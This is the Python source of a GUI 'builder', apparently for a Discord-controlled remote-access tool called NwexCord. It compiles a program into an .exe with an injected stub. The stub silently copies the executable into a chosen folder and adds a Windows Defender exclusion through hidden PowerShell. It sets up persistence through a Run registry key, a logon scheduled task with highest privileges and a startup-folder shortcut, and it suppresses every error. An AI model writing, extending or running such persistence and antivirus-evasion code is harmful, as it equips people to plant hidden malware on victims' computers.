#!/usr/bin/env python3
"""
NwexCord Builder - Build NwexCord into a standalone .exe
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import subprocess
import threading
import os
import sys
import shutil
import tempfile
import base64

ICON_B64 = ''


# Stub code injected into the built exe for persistence/installation
STUB_TEMPLATE = r'''
import os, sys, shutil, subprocess

# ── Settings ──
INSTALL_DIR = r"{install_dir}"
EXE_NAME = r"{exe_name}"
ENABLE_REGISTRY = {enable_registry}
ENABLE_SCHTASKS = {enable_schtasks}
ENABLE_STARTUP = {enable_startup}
ENABLE_WDEX = {enable_wdex}

def _resolve_path(p):
    return os.path.expandvars(p)

def _install():
    try:
        target_dir = _resolve_path(INSTALL_DIR)
        os.makedirs(target_dir, exist_ok=True)
        target_path = os.path.join(target_dir, EXE_NAME)
        current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        if os.path.normpath(current_path).lower() != os.path.normpath(target_path).lower():
            shutil.copy2(current_path, target_path)
        # WD Exclusion
        if ENABLE_WDEX:
            try:
                subprocess.run(
                    ['powershell', '-WindowStyle', 'Hidden', '-Command',
                     'Add-MpPreference -ExclusionPath "' + target_dir + '" -ErrorAction SilentlyContinue'],
                    capture_output=True, creationflags=0x08000000
                )
            except Exception:
                pass
        # Registry
        if ENABLE_REGISTRY:
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, EXE_NAME.replace('.exe',''), 0, winreg.REG_SZ, target_path)
                winreg.CloseKey(key)
            except Exception:
                pass
        # Schtasks
        if ENABLE_SCHTASKS:
            try:
                task_name = EXE_NAME.replace('.exe','')
                subprocess.run(
                    'schtasks /create /tn "' + task_name + '" /tr "' + target_path + '" /sc onlogon /rl highest /f',
                    shell=True, capture_output=True, creationflags=0x08000000
                )
            except Exception:
                pass
        # Startup Folder
        if ENABLE_STARTUP:
            try:
                startup_dir = os.path.join(os.environ.get('APPDATA',''), r'Microsoft\Windows\Start Menu\Programs\Startup')
                startup_lnk = os.path.join(startup_dir, EXE_NAME.replace('.exe', '.lnk'))
                if not os.path.exists(startup_lnk):
                    ps_cmd = (
                        '$ws = New-Object -ComObject WScript.Shell; '
                        '$sc = $ws.CreateShortcut("' + startup_lnk + '"); '
                        '$sc.TargetPath = "' + target_path + '"; '
                        '$sc.Save()'
                    )
                    subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_cmd],
                        capture_output=True, creationflags=0x08000000)
            except Exception:
                pass
    except Exception:
        pass

_install()
'''


class NwexCordBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("NwexCord Builder")
        self.root.geometry("620x680")
        self.root.resizable(False, False)
        self.root.configure(bg="#0e0e10")

        try:
            icon_path = os.path.join(tempfile.gettempdir(), "nwcbd_icon.ico")
            if not os.path.exists(icon_path):
                import base64
                with open(icon_path, "wb") as f:
                    f.write(base64.b64decode(ICON_B64))
            
            import ctypes
            # Trick Windows into giving this taskbar icon priority over Python's built-in feather icon
            myappid = 'nwexy.nwexcord.builder' 
            ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
            self.root.iconbitmap(default=icon_path)
            self.icon_path_default = icon_path
        except Exception as e:
            print("Failed to load icon:", e)
            self.icon_path_default = ""
            pass

        self.building = False
        
        # Variables setup
        self.show_token = tk.BooleanVar(value=False)
        self.output_path = tk.StringVar(value=os.path.join(os.path.expanduser("~"), "Desktop"))
        self.var_registry = tk.BooleanVar(value=True)
        self.var_schtasks = tk.BooleanVar(value=True)
        self.var_startup = tk.BooleanVar(value=True)
        self.install_path_var = tk.StringVar(value="%ProgramData%")
        self.var_subdir = tk.BooleanVar(value=True)
        self.subdir_name_var = tk.StringVar(value="NwexCord")
        self.exe_name_var = tk.StringVar(value="App.exe")
        self.var_wdex = tk.BooleanVar(value=False)
        self.icon_path = tk.StringVar(value=self.icon_path_default)

        # Frames for simple activity-like switching
        self.main_frame = tk.Frame(self.root, bg="#0e0e10")
        self.settings_frame = tk.Frame(self.root, bg="#0e0e10")

        self.setup_main_ui()
        self.setup_settings_ui()
        
        # Start with main view
        self.main_frame.pack(fill="both", expand=True)

    def go_to_main(self):
        self.settings_frame.pack_forget()
        self.main_frame.pack(fill="both", expand=True)

    def go_to_settings(self):
        self.main_frame.pack_forget()
        self.settings_frame.pack(fill="both", expand=True)

